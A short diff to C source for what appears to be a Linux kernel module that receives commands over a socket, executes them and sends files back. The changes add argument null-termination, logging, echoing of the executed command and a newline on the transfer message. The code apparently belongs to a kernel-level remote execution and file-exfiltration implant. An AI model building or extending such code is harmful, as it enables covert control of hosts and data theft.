@@ -87,6 +87,8 @@ int cmd_build(struct command *cmd, const char *payload)
         return ERR_LONG_ARGS;
     }
     strncpy(cmd->args, payload + 2, args_len);
+    cmd->args[args_len] = '\0';
+    pr_info("commands: cmd_len: %lu, args_len: %lu, args: %s\n", cmd_len, args_len, cmd->args);
 
     return 0;
 }
@@ -102,7 +104,7 @@ static int do_exec_sync(struct socket *sock, char *args)
         // exec didn't happen, return non-zero
         sprintf(buf, "couldn't exec. internal error code %d\n", ret);
     }
-    sprintf(buf, "execed command successfully. status: %d\n", status);
+    sprintf(buf, "> %s [STATUS: %d]\n", args, status);
 
     // Send status code:
     vec.iov_base = buf;
@@ -197,7 +199,7 @@ static int do_download(struct socket *sock, char *args)
     filp_close(file, NULL);
 
     // Finished with file. Send DONE:
-    sprintf(buf, "DONE");
+    sprintf(buf, "DONE\n");
     vec.iov_base = buf;
     vec.iov_len = strlen(buf);
     if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
